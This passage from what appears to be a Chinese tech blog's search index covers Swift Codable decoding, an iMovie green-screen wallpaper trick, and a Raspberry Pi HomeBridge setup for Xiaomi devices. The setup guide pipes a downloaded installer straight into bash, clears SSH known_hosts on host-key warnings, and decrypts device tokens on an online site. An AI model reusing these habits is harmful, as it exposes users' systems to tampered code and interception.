print(song)}//switch case letswitch result.targetObject {case .song(let song): print(song)case .user(let user): print(user)}方式 b.改宣告欄位屬性為 Base Class。struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } enum PredictKey: String, CodingKey { case type } var id: Int var comment: String var targetObject: Decodable var commenter: UserEntity init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) self.comment = try container.decode(String.self, forKey: .comment) self.commenter = try container.decode(UserEntity.self, forKey: .commenter) // let targetObjectContainer = try container.nestedContainer(keyedBy: PredictKey.self, forKey: .targetObject) let targetObjectType = try targetObjectContainer.decode(String.self, forKey: .type) if targetObjectType == \"user\" { self.targetObject = try container.decode(UserEntity.self, forKey: .targetObject) } else { self.targetObject = try container.decode(SongEntity.self, forKey: .targetObject) } }}原理差不多，但這邊先使用 nestedContainer 衝進去 targetObject 拿 type 出來判斷，再決定 targetObject 要解析成什麼類型。要使用時再 Cast ：if let song = result.targetObject as? Song { print(song)} else if let user = result.targetObject as? User { print(user)}場景2. 假設資料陣列欄位放多種類型的資料該如何 Decode?{ \"results\": [ { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" } ]}結合上述提到的 nestedUnkeyedContainer +場景1. 的解決方案即可；這邊也能改用 場景1. 的 a.解決方案 ，用 Associated Value Enum 存取值。場景3. JSON String 欄位有給值時才 Decode[ { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, { \"type\": \"song\", \"id\": 11 }]使用 decodeIfPresent 進行 decode。場景4. 陣列資料略過 Decode 失敗錯誤的資料{ \"results\": [ { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, { \"error\": \"errro\" }, { \"type\": \"song\", \"id\": 19, \"name\": \"帶我去找夜生活\" } ]}如前述，Decodable 預設是所有資料剖析都正確才能 Mapping 輸出；有時會遇到後端給的資料不穩定，給一長串 Array 但就有幾筆資料缺了欄位或欄位類型不符導致 Decode 失敗；造成整包全部失敗，直接 nil。struct ResultsEntity: Decodable { enum CodingKeys: String, CodingKey { case results } var results: [SongEntity] init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) var nestedUnkeyedContainer = try container.nestedUnkeyedContainer(forKey: .results) self.results = [] while !nestedUnkeyedContainer.isAtEnd { if let song = try? nestedUnkeyedContainer.decode(SongEntity.self) { self.results.append(song) } else { let _ = try nestedUnkeyedContainer.decode(EmptyEntity.self) } } }}struct EmptyEntity: Decodable { }struct SongEntity: Decodable { var type: String var id: Int var name: String}let jsonString = \"{ \\\"results\\\": [ { \\\"type\\\": \\\"song\\\", \\\"id\\\": 99, \\\"name\\\": \\\"披星戴月的想你\\\" }, { \\\"error\\\": \\\"errro\\\" }, { \\\"type\\\": \\\"song\\\", \\\"id\\\": 19, \\\"name\\\": \\\"帶我去找夜生活\\\" } ] }\"let jsonDecoder = JSONDecoder()let result = try jsonDecoder.decode(ResultsEntity.self, from: jsonString.data(using: .utf8)!)print(result)解決方式也類似 場景2.的解決方案 ； nestedUnkeyedContainer 遍歷每個內容，並進行 try? Decode，如果 Decode 失敗則使用 Empty Decode 讓 nestedUnkeyedContainer 的內部指針繼續執行。 ＊此方法有點 workaround，因我們無法對 nestedUnkeyedContainer 命令跳過，且 nestedUnkeyedContainer 必須有成功 decode 才會繼續執行；所以才這樣做，看 swift 社群有人提增加 moveNext( ) ，但目前版本尚未實作。場景5. 有的欄位是我程式內部要使用的，而非要 Decode方式a. Entity/Model這邊就要提一開始說的，我們拆分 Entity/Model 的功用了；Entity 單純負責 JSON String to Entity(Decodable) Mapping；Model initWith Entity，實際程式傳遞、操作、商業邏輯都是使用 Model。struct SongEntity: Decodable { var type: String var id: Int var name: String}class SongModel: NSObject { init(_ entity: SongEntity) { self.type = entity.type self.id = entity.id self.name = entity.name } var type: String var id: Int var name: String var isSave:Bool = false //business logic}拆分 Entity/Model 的好處： 權責分明，Entity: JSON String to Decodable, Model: business logic 一目瞭然 mapping 了哪些欄位看 Entity 就知道 避免欄位一多全喇在一起 Objective-C 也可用 （因 Model 只是 NSObject、struct/Decodable Objective-C 不可見） 內部要使用的商業邏輯、欄位放在 Model 即可方式b. init 處理列出 CodingKeys 並排除內部使用的欄位，init 時給預設值或欄位有給預設值或設為 Optional，但都不是好方法，只是可以 run 而已。[2020/06/26 更新] — 下篇 場景6.API Response 使用 0/1 代表 Bool，該如何 Decode? 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)[2020/06/26 更新] — 下篇 場景7.不想要每每都要重寫 init decoder 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)[2020/06/26 更新] — 下篇 場景8.合理的處理 Response Null 欄位資料 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)綜合場景範例綜合以上基本使用及進階使用的完整範例：{ \"count\": 5, \"offset\": 0, \"limit\": 10, \"results\": [ { \"id\": 123456, \"comment\": \"是告五人，不是五告人!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\", \"create_date\": \"2020-06-13T15:21:42+0800\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\", \"birthday\": \"1994/07/18\" } }, { \"error\": \"not found\" }, { \"error\": \"not found\" }, { \"id\": 2, \"comment\": \"哈哈，我也是!\", \"target_object\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\", \"birthday\": \"1994/07/18\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"路人甲\", \"email\": \"man@gmail.com\", \"birthday\": \"2000/01/12\" } } ]}Output:zhgchgli:是告五人，不是五告人!完整範例演示如上！(下)篇＆其他場景已更新： 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)總結選擇使用 Codable 的好處，第一當然是因為原生，不用怕後續無人維護、還有寫起來漂亮；但相對的限制較嚴格、比較不能靈活解 JSON String，不然就是要如本文做更多的事去完成、還有效能其實不比使用其他 Mapping 套件優（Decodable 依然使用Objective 時代的 NSJSONSerialization 進行解析），但我想在後續的更新中或許蘋果會對此進行優化，那時我們也不必更動程式。文中場景、範例或許有些很極端，但有時候遇到了也沒辦法；當然希望一般情況下單純的 Codable 就能滿足我們的需求；但有了以上招式之後應該沒有打不倒的問題了！ 感謝 ＠saiday 大大技術支援。延伸閱讀 深入 Decodable — — 写一个超越原生的 JSON 解析器 滿滿的內容，深入了解 Decoder/JSONDecoder。 不同角度看问题 — 从 Codable 到 Swift 元编程 Why Model Objects Shouldn’t Implement Swift’s Decodable or Encodable Protocols有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 3,502 Total Views Last Statistics Date: 2025-01-19 | 3,412 Views on Medium. " }, { "title": "使用 iPhone 簡單製作「偽」透視透明手機桌布", "url": "/posts/2e4429f410d6/", "categories": "ZRealm Life.", "tags": "iphone, 生活, imovie, chroma-key, wallpaper", "date": "2020-05-10 15:37:42 +0800", "snippet": "使用 iPhone 簡單製作「偽」透視透明手機桌布應用 iMovie 綠幕摳圖功能合成影片反正我很閒白天工作，被資本家剝削肉體；晚上又被大眾娛樂剝削心靈，依然做不到白天工作、晚上讀書、假日批判的境界 ！最近在無腦放鬆的時候， 滑到一個很常見的桌布 APP 廣告，廣告中展示了一個透視透明的桌布很吸睛 ；但可想而知是不可能的，就算後置相機實時取景角度也不可能這麼吻合！【Youtuber內幕】美劇...", "content": "使用 iPhone 簡單製作「偽」透視透明手機桌布應用 iMovie 綠幕摳圖功能合成影片反正我很閒白天工作，被資本家剝削肉體；晚上又被大眾娛樂剝削心靈，依然做不到白天工作、晚上讀書、假日批判的境界 ！最近在無腦放鬆的時候， 滑到一個很常見的桌布 APP 廣告，廣告中展示了一個透視透明的桌布很吸睛 ；但可想而知是不可能的，就算後置相機實時取景角度也不可能這麼吻合！【Youtuber內幕】美劇、影集注意！揭發大眾媒體不會告訴你的荼毒真相！白天工作 晚上讀書 假日批判！還原欺騙秘辛｜反正我很閒完成效果我們要做個有腦的青年！雖然知道是特效，本來以為會非常複雜；沒想到 iPhone 內建的 iMovie APP 簡單點一點就能製作了。只需要： 一支 iPhone（因為要直接使用 iMovie）、入鏡用手機 一支負責拍攝的手機 or 相機 手機架 or 水瓶…或任何可以支撐手機的物品 iMovie APP （免費下載） 綠色底圖（綠幕）可直接下載此圖或從 網路取得這 5 樣東西就能製作出透視效果！具體流程： 架好負責拍攝的手機 直接拍攝一段乾淨的影片（無手機入鏡） 將要入鏡的手機底圖設為綠色底圖 再拍攝一段入鏡手機的操作影片 開啟 iMovie APP 合成 完成開始1. 將手機架設好、抓好拍攝角度我使用兩個鰻魚罐頭跟一瓶礦泉水當作手機架（如果有立式手機架當然更好！）使用手機架拍攝的目的是由於我們希望兩部影片的角度都是統一的，否則會出現畫面位移的情況，看起來效果就沒那麼好；手持的話勢必不可能兩部影片 100% 視角位置都ㄧ樣。2.拍攝一段乾淨的影片影片想要多長，乾淨的影片就拍攝多長。3.將入鏡手機的桌布設為綠色底圖「設定」-&gt; 「背景圖片」-&gt;「選擇下載下來的綠色底圖」-&gt;「同時設定」完成圖4.拍攝一段入鏡手機的操作影片影片時長同 2. 乾淨影片；超過也沒關係，之後再裁剪。5.開啟 iMovie APP 建立專案「+」-&gt;「影片」-&gt; 選擇「 乾淨的影片 」-&gt;「製作影片」插入乾淨的影片到專案中。6. 將播放位置移到最前若沒有將乾淨的影片播放位置移至影片起始點，否則在後續插入綠幕影片時會出現「 將播放磁頭從結尾處移開來加入覆疊 」。7.插入入鏡手機操作影片點擊右上角「+」-&gt;「影片」-&gt;「全部」選擇「入鏡的操作影片」-&gt;「…」-&gt;「綠色/藍色螢幕」（俗稱：摳圖）點選上方「入鏡操作影片」-&gt;「滾動到有綠色桌布的影格」-&gt; 點擊「綠色區域」-&gt; 完成透視透明8.合成完成！匯出影片確認兩段影片結束時間一致，點擊左上角「完成」-&gt; 下方「分享」 -&gt; 選擇輸出目標 -&gt; 輸出完成9. 完成Tips 可先隱藏有綠色圖標的 APP，如 Line、訊息…. 防止穿幫（因摳圖依據是綠色） 或可使用藍色底圖，改摳藍色；或其他顏色也可（但綠/藍效果最佳） 同原理還有更多玩法，等你發掘！結語just for fun…沒想到 iMovie 功能這麼強大！延伸閱讀 [生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 6,988 Total Views Last Statistics Date: 2025-01-19 | 6,954 Views on Medium. " }, { "title": "打造舒適的 WFH 智慧居家環境，控制家電盡在指尖", "url": "/posts/99db2a1fbfe5/", "categories": "ZRealm Life.", "tags": "homekit, iphone, homebridge, 米家, 生活", "date": "2020-04-20 22:37:49 +0800", "snippet": "打造舒適的 WFH 智慧居家環境，控制家電盡在指尖示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKitphoto by picjumbo.com關於因為疫情的關係，在家時間變長了；尤其是要 Work From Home 的話，家裡的電器設備最好都能在 APP 上智能控制，就不用一下子離開去開燈、一下子去開電鍋…等等，很浪費時間。之前寫過一篇「 智慧家居初體驗 — ...", "content": "打造舒適的 WFH 智慧居家環境，控制家電盡在指尖示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKitphoto by picjumbo.com關於因為疫情的關係，在家時間變長了；尤其是要 Work From Home 的話，家裡的電器設備最好都能在 APP 上智能控制，就不用一下子離開去開燈、一下子去開電鍋…等等，很浪費時間。之前寫過一篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」 ，初試使用 HomeBridge 將小米家電串上 HomeKit，實證理論上可行，但實際應用提到的不多，今天這篇算是綜合前篇的進階完整版，包含選擇樹莓派當主機的話該怎麼設定，從頭到尾手把手教學。起因是最近換了 iPhone 11 Pro 能支援 iOS ≥ 13 捷徑的 NFC 自動化功能，就是手機感應到 NFC Tag 就能執行相應的捷徑；雖然 可以直接拿舊的悠遊卡當 NFC Tag ，但太占空間也沒那麼多張卡；我去光華問了一圈都沒有再賣 NFC Tag 感應貼紙，最後才在蝦皮找到 $50 一張，買了 5 張來玩玩，賣家還很貼心的幫我用顏色區隔開。*NFC 自動化功能是綁機型的，只有 iPhone XS/XS max/XR/11/11pro/11pro max 支援這個功能，之前拿 iPhone 8 完全沒 NFC這選項。稍微把玩了一下發現有個問題，就是執行米家 APP 的捷徑時一定要打開「執行時顯示」選項（否則不會真的執行）， 感應到 Tag 要執行時還要解鎖 iPhone 、執行時也會開啟捷徑，無法在後台直接感應執行 ；另外實測了如果捷徑是原生蘋果的服務（如：HomeKit 的家電）就能在背景&amp;免解鎖下直接執行；而且 homeKit 的反應速度、穩定度都比米家好很多。這在爽度上有很大的差別，所以就又深入研究了將米家智慧家居系列的產品都接上 HomeKit，有支援 HomeKit 的就直接綁定本篇不贅述；不支援的就照此文教學也一起綁定上去！我的米家智慧家居項目 米家智慧攝影機 雲台版 1080P 米家直流變頻電風扇 米家 LED 智慧檯燈 小米空氣淨化器 3 米家檯燈 Pro（本身就支援 HomeKit） 米家 LED 智慧燈泡 彩光版 * 2 （本身就支援 HomeKit）運作原理做了一張簡易的參考圖，如果智慧家電有支援 HomeKit 就直接串上去、 不支援的智慧家電透過架設「HomeBridge」服務主機（要一直開機）也能橋接串上去 ；在同一個網路環境下（EX: 同個 WiFi）iPhone 可以自由地控制 HomeKit 中的所有家電項目；但若在外部網路，如 4G 行動網路情況下，就需要有一台 Apple TV/HomePod 或 iPad 當家庭中樞主機，在家待命（一樣要一直開著） 才能在外面控制家中的 HomeKit，若無家庭中樞在外面打開家庭 APP 會顯示「 無回應 」。 *若是米家的話，會經由米家伺服器控制家裡的電器，要說的話 會有安全問題，資料都要經過大陸 。需求環境所以一共有兩個設備要一直開著待命，一台是 Apple TV/HomePod 或 iPad 家庭中樞主機；這部分目前無解，無法用其他方式模擬，只能想辦法取得這些設備，如果沒有就只能在家使用 HomeKit 。另一台只要是能 24 hr 待命的電腦（如您的 iMac/MacBook）、閒置的主機（舊的 iMac、Mac Mini）或樹莓派都可以。 *windows 系列未嘗試，不過應該也可以！亦或是你想玩玩也可以直接用目前的電腦來用（可搭配 前篇文章 一起服用）。本文將以樹莓派（Raspberry Pi 3B）、使用 Macbook Pro (MacOS 10.15.4) 操作下作示範，從設定樹莓派的環境從頭開始講；若不是使用樹莓派的朋友可以直接略過跳到 HomeBridge 串接 HomeKit 的部分（這裡都一樣）。Raspberry Pi 3B (special thanks to Lu Xun Huang )若是使用樹莓派還需要一張 micro SD 記憶卡（不用太大，我用 8G）、讀卡機、網路線（設定用，之後可連 WiFi）；還有樹莓派需要的軟體： 樹莓派桌面版作業系統（方便大家入門，使用 GUI 版） Etcher 燒錄軟體樹莓派環境設定燒錄作業系統下載完需求的兩個軟體後，我們先將記憶卡放入讀卡機插上電腦；打開 Etcher 程式（balenaEtcher）第一項選擇剛下載的樹莓派作業系統「xxxx.img」、第二項選擇你的記憶卡裝置，然後點擊「Flash!」開始燒錄！此時會跳出要你輸入 MacOS 的密碼 ，輸入後按「Ok」繼續。燒錄中…請稍候….驗證中…請稍候….燒錄成功！ *若有出現紅色的 Error ，可嘗試將記憶卡格式化後再次燒錄。重新將讀卡機接上電腦，並在記憶卡內容目錄下建立一個空的 「ssh」 檔案（ 或點此下載 ）內容空白、不用副檔名，就是個「ssh」檔；讓我們可以用 Terminal 連線進樹莓派。ssh設定樹莓派將記憶卡退出，插入樹莓派上並接上網路線，然後通電開機；並讓 MacBook 跟樹莓派在同個網路環境下。查看樹莓派分配到的 IP 位置得到 樹莓派分配到的 IP 位置是： 192.168.0.110 (本文所有出現的 IP 請自行更換成你查到的結果) 建議將樹莓派設定為指定/保留 IP，否則開機重連後 IP 位置可能會變動，要重新查。使用 SSH 連入樹莓派進行操作打開 Terminal 輸入：ssh pi@你的樹莓派IP位址有詢問就輸入 yes ，密碼輸入預設密碼： raspberry連線成功！ *若有出現 WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED 之類的錯誤訊息就先去 /Users/xxxx/.ssh/known_hosts 用文字編輯器打開清空即可樹莓派基本工具安裝、設定 輸入以下指令安裝 Vim 編輯器：sudo apt-get install vim2.解決以下語系警告：perl: warning: Setting locale failed.perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_LANG = \"zh_TW.UTF-8\", LANG = \"zh_TW.UTF-8\" are supported and installed on your system.perl: warning: Falling back to the standard locale (\"C\").輸入vi .bashrc按「Enter」進入按「 i 」進入編輯模式移動到文件最底部，加上一行「 export LC_ALL=C 」按「Esc」輸入「 :wq! 」儲存退出。再下「 source .bashrc 」更新即可。3.安裝 nvm 管理 nodejs/npm：curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash4.用 nvm 安裝最新版 nodejs ：nvm install 12.16.2 *這邊選擇安裝「12.16.2」版本5.確認環境安裝完成：輸入以下指令npm -v和node -v確認沒錯誤訊息即可！6.建立 nodejs 連結輸入以下指令which node取得 nodejs 所在路徑資訊再輸入sudo ln -fs 這邊貼上你 which node 查到的路徑(不用\"雙引號) /usr/local/bin/node建立連結設定完成！啟用樹莓派 VNC 遠端桌面功能這邊我們雖然是裝 GUI 版，你當然可以直接將樹莓派接上鍵盤、HDMI 當一般電腦使用，但為了方便我們將使用遠端桌面的方式控制樹莓派。輸入：sudo raspi-config進入設定：選擇第五項「 Interfacing Options 」選擇第三項「 P3 VNC 」使用 「 ← 」選擇「 Yes 」打開VNC 遠端桌面功能啟用成功！使用 「 → 」直接切到「 Finish 」退出設定介面。將 VNC 遠端桌面服務加入到開機自動啟動項我們希望 VNC 遠端桌面服務是樹莓派開機後就自動啟用的。輸入sudo vim /etc/init.d/vncserver按「Enter」進入按「 i 」進入編輯模式#!/bin/sh### BEGIN INIT INFO# Provides: vncserver# Required-Start: $local_fs# Required-Stop: $local_fs# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start/stop vncserver### END INIT INFO# More details see:# http://www.penguintutor.com/linux/vnc### Customize this entry# Set the USER variable to the name of the user to start vncserver underexport USER='pi'### End customization requiredeval cd ~$USERcase \"$1\" in start) su $USER -c '/usr/bin/vncserver -depth 16 -geometry 1024x768 :1' echo \"Starting VNC server for $USER \" ;; stop) su $USER -c '/usr/bin/vncserver -kill :1' echo \"vncserver stopped\" ;; *) echo \"Usage: /etc/init.d/vncserver {start|stop}\" exit 1 ;;esacexit 0「Commend」＋「C」、「Commend」＋「V」複製貼上以上內容進去，按「Esc」輸入「:wq!」儲存退出。再輸入：sudo chmod 755 /etc/init.d/vncserver修改文件權限。再輸入：sudo update-rc.d vncserver defaults加入到開機自動啟動項目。最後輸入：sudo reboot重新啟動樹莓派。 *重新啟動完成後，再照之前的步驟重新使用 ssh 連線進來。使用 VNC Client 進行連線：這邊使用的是 Chrome 的 APP 「 VNC® Viewer for Google Chrome™ 」，安裝完啟動後，輸入 樹莓派 IP 位置:1 ，請注意後面的 Port:1 要加上！ *我使用 Mac 自帶的 VNC:// 無法連線，不確定原因。點選「 Connect 」。點選「 ＯＫ 」。輸入登入帳號密碼 ，同 SSH 連線，帳號 pi 預設密碼 raspberry 。成功連入！完成樹莓派初始化設定：再來都是圖形介面！很容易！設定語言、地區、時區。更改樹莓派預設密碼，輸入你要設定的密碼。直接下一步「 Next 」。設定使用 WiFi 連線，之後就不用在插線了。 *但請注意樹莓派 IP位置可能會改變，要再進路由器查詢是否要更新當前作業系統，不趕時間就選「 Next 」更新吧！ *更新大約需要20~30分鐘（依照你的網路速度）更新完成後，點擊「 Restart 」重新啟動。樹莓派環境設定完成！HomeBridge 安裝正式進入重頭戲，安裝使用 HomeBridge。使用Terminal ssh 連線進樹莓派或直接使用 VNC 遠端桌面裡的 Terminal。輸入：npm -g install homebridge - unsafe-perm^( 不加 sudo )安裝 HomeBridge安裝完成！建立/修改設定檔(config.json)：為了方便編輯，使用 VNC 遠端桌面連線至樹莓派 (也可直接用指令) ：點左上角打開「 檔案管理程式 」-&gt; 進入「 /home/pi/.homebridge 」若沒看到「config.json」檔案則在空白處點右鍵「 New File 」-&gt; 輸入檔案名稱「 config.json 」在「 config.json 」上按右鍵用「 Text Editor 」打開貼上以下基礎設定內容：{ \"bridge\": { \"name\": \"Homebridge\", \"username\": \"CC:22:3D:E3:CE:30\", \"port\": 51826, \"pin\": \"123-45-568\"}內容不用特別更改，直接照搬即可！ 記得存檔！完成！綁定 HomeBridge 到 Homekit輸入：homebridge start^( 不加 sudo )啟用 *若出現 Error: Service name is already in use on the network / port被佔用之類的錯誤可嘗試砍掉服務、改用 homebridge restart 重啟、或重新開機。 *若出現was not registered by any plugin之類的錯誤則代表你還沒有安裝相應的homebridge plugin。 啟動中有更改 設定檔(config.json)內容的話要改下： sudo homebridge restart 重新啟動 HomeBridge *按「Control」+「C」可在 Terminal 關閉退出 HomeBridge 服務。拿出 iPhone 打開「家庭」APP，在「家庭」右上角點「+」，選「加入配件」， 掃描你出現的 QRCode 。這時應該會出現「 找不到配件 」，別擔心！因為我們還沒有加入任何配件到 HomeBridge 橋接器上，沒關係，讓我們繼續往下看。至少要有一個配件才能掃描加入! ! ! (這邊以攝影機為範例) ： 至少要有一個配件才能掃描加入! ! ! (這邊以攝影機為範例) ： 至少要有一個配件才能掃描加入! ! ! (這邊以攝影機為範例) ：第一次掃描加入會出現警告視窗，按「強制加入」即可！ 加入過一次後，後面再新增的配件都不用再次掃描了，會自己更新進去！將 HomeBridge 服務加入樹莓派開機自動啟動項目同 VNC 遠端桌面服務，我們也希望 HomeBridge 服務是樹莓派開機後就自動啟用的，不然一但重開機就要再次手動連進來啟用。輸入：which homebridge取得 homebridge 路徑資訊記下此路徑。再輸入：sudo vim /etc/init.d/homebridge按「Enter」進入按「 i 」進入編輯模式#!/bin/sh### BEGIN INIT INFO# Provides:# Required-Start: $remote_fs $syslog# Required-Stop: $remote_fs $syslog# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start daemon at boot time# Description: Enable service provided by daemon.### END INIT INFOdir=\"/home/pi\"cmd=\"DEBUG=* 這邊貼上你 which homebridge 查到的路徑\"user=\"pi\"name=`basename $0`pid_file=\"/var/run/$name.pid\"stdout_log=\"/var/log/$name.log\"stderr_log=\"/var/log/$name.err\"get_pid() {cat \"$pid_file\"}is_running() {[ -f \"$pid_file\" ] &amp;&amp; ps -p `get_pid` &gt; /dev/null 2&gt;&amp;1}case \"$1\" instart)if is_running; thenecho \"Already started\"elseecho \"Starting $name\"cd \"$dir\"if [ -z \"$user\" ]; thensudo $cmd &gt;&gt; \"$stdout_log\" 2&gt;&gt; \"$stderr_log\" &amp;elsesudo -u \"$user\" $cmd &gt;&gt; \"$stdout_log\" 2&gt;&gt; \"$stderr_log\" &amp;fiecho $! &gt; \"$pid_file\"if ! is_running; thenecho \"Unable to start, see $stdout_log and $stderr_log\"exit 1fifi;;stop)if is_running; thenecho -n \"Stopping $name..\"kill `get_pid`for i in 1 2 3 4 5 6 7 8 9 10# for i in `seq 10`doif ! is_running; thenbreakfiecho -n \".\"sleep 1doneechoif is_running; thenecho \"Not stopped; may still be shutting down or shutdown may have failed\"exit 1elseecho \"Stopped\"if [ -f \"$pid_file\" ]; thenrm \"$pid_file\"fifielseecho \"Not running\"fi;;restart)$0 stopif is_running; thenecho \"Unable to stop, will not attempt to start\"exit 1fi$0 start;;status)if is_running; thenecho \"Running\"elseecho \"Stopped\"exit 1fi;;*)echo \"Usage: $0 {start|stop|restart|status}\"exit 1;;esacexit 0將：cmd=”DEBUG=* 這邊貼上你 which homebridge 查到的路徑”替換入你查到的路徑資訊（不用“雙引號）「Commend」＋「C」、「Commend」＋「V」複製貼上以上內容進去，按「Esc」輸入「:wq!」儲存退出。再輸入：sudo chmod 755 /etc/init.d/homebridge修改文件權限。最後輸入：sudo update-rc.d homebridge defaults加入到開機自動啟動項目。完成！ 可直接使用 sudo /etc/init.d/homebridge start 啟用 homebridge 服務。 另可使用： tail -f /var/log/homebridge.err 查看啟動錯誤訊息、 tail -f /var/log/homebridge.log 查看 log 。米家智慧家電串接前準備Homebridge on 起來後，我們就可以開始逐個將所有米家家電加入至 Homebridge 接上 homeKit！首先我們要先將米家智慧家電都加入「 米家APP 」 ，我們要從其中獲取串接上 HomeBridge 的資訊。智慧家電都加入米家 APP 後：將 iPhone 接上 Mac 電腦，打開 Finder/Itunes 介面，選擇接上的手機選備份到「 這部電腦 」、 「 不要勾！替本機備份加密」 ，點「 立即備份 」備份完成後， 下載 安裝備份查看軟體： iBackupViewer打開「 iBackupViewer 」 初次啟動會要你去 Mac「系統偏好設定」- 「安全性與隱私權」-「隱私權」-「+」- 加入「iBackupViewer」 *如有隱私顧慮可關閉網路使用這套軟體、並在使用後移除再次打開「 iBackupViewer 」成功讀取到備份檔後，點擊「剛備份的手機」選擇「 App Stroe 」Icon左方找到「米家 APP (MiHome.app)」-&gt; 右方找到「 數字_mihome.sqlite」 這個檔案並「 選擇 」 -&gt; 右上角「 Export 」-&gt; 「 Selected Files 」 *若有兩個 「數字_mihome.sqlite」檔案，則挑 Created 建立時間最新的來用。將剛剛匯出的 數字_mihome.sqlite 檔案 拖曳進這個網站查看內容：可將查詢語法換成：SELECT `ZDID`,`ZNAME`,`ZTOKEN` FROM 'ZDEVICE' LIMIT 0,30僅顯示我們需要的欄位資訊 （若有特別的家電套件需要其他的欄位資訊也可以加上去做篩選） ZDID: 裝置 ID ZNAME: 裝置名稱 ZTOKEN: 裝置 ZToken ZTOKEN 不能直接用，要轉換成 “Token” 才能使用。這邊以攝影機的 ZToken 轉換 Token 為例：首先，我們從上面列表取得攝影機的 ZToken 欄位內容7f1a3541f0433b3ccda94beb856c2f5ba2b15f293ce0cc398ea08b549f9c74050143db63ee66b0cdff9f69917680151e但這邊拿到的 TOKEN 還不能用，我們還需要將他轉換打開 http://aes.online-domain-tools.com/ 這個網站： 將剛剛複製出來的 ZTOKEN 貼在「Input Text」，選「Hex」 Key輸入「00000000000000000000000000000000」32個0，ㄧ樣選「Hex」 然後按下「Decrypt!」轉換 全選複製右下角兩行的輸出內容＆去掉空格後就是我們要的結果 Token「 6d304e6867384b704b4f714d45314a34 」就是我們要的 Token 結果！ *Token 去得方式這塊有嘗試用「miio」直接嗅探的方式，但好像是米家韌體有更新過，已無法用這個方法快速方便得到 Token 了！最後，我們還要知道 裝置的 IP 位址 (這邊一樣以攝影機為例)：打開米家APP → 攝影機 → 右上角「…」→設定→網路訊息，得到 IP位址 ！ 記錄下 ZDID/Token/IP 這些資訊，供後續使用。將米家智慧家電逐個串入 HomeBridge依照個別裝置需要用到的套件、連線資訊不同，逐個安裝、設定，加入至 HomeBridge。 再來打開 Terminal ssh 連線進樹莓派或直接使用 VNC 遠端桌面裡的 Terminal，繼續後續作業….1.米家攝影機雲臺版：在 Terminal 下命令安裝 MijiaCamera 這個 homebridge 套件 ( 不加 sudo )：npm install -g homebridge-mijia-camera參考前文的修改設定檔(config.json)教學，在檔案中加入 accessories 區塊 ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"\", \"token\":\"\" } ]}accessories: 加入米家攝影機的設定資訊，ip 帶入攝影機 ip、token 帶入帶入前文教學教的 token 記得存檔！然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：攝影機開/關2.米家直流變頻電風扇在 Terminal 下命令安裝 homebridge-mi-fan 這個 homebridge 套件 (不加 sudo) ：npm install -g homebridge-mi-fan參考前文的修改設定檔(config.json)教學，在檔案中加入 platforms 區塊(若已有則在區塊內「,」新增一個子區塊) ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"platforms\":[ { \"platform\":\"MiFanPlatform\", \"deviceCfgs\":[ { \"type\":\"MiDCVariableFrequencyFan\", \"ip\":\"\", \"token\":\"\", \"fanName\":\"room fan\", \"fanDisable\":false, \"temperatureName\":\"room temperature\", \"temperatureDisable\":true, \"humidityName\":\"room humidity\", \"humidityDisable\":true, \"buzzerSwitchName\":\"fan buzzer switch\", \"buzzerSwitchDisable\":true, \"ledBulbName\":\"fan led switch\", \"ledBulbDisable\":true } ] } ]}platforms: 加入米家電風扇設定資訊，ip 帶入攝影機 ip、token 帶入前文教學教的 token、humidity/temperature 可控制是否連動顯示溫濕度計資訊、type 需帶入對應型號的文字 ，支援四種不同型號的電風扇： 智米直流變頻落地扇：ZhiMiDCVariableFrequencyFan 智米自然風風扇：ZhiMiNaturalWindFan 米家直流變頻：MiDCVariableFrequencyFan (台灣賣的) 米家風扇：DmakerFan請自行帶入自己的風扇型號。 記得存檔！然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：電風扇開/關、風力大小調整3.小米空氣淨化器 3在 Terminal 下命令安裝 homebridge-xiaomi-air-purifier3 這個 homebridge 套件 (不加 sudo) ：npm install -g homebridge-xiaomi-air-purifier3參考前文的修改設定檔(config.json)教學，在檔案中加入 accessories 區塊(若已有則在區塊內「,」新增一個子區塊) ：{ \"bridge\":{ \"name\":\"Homebridge\", 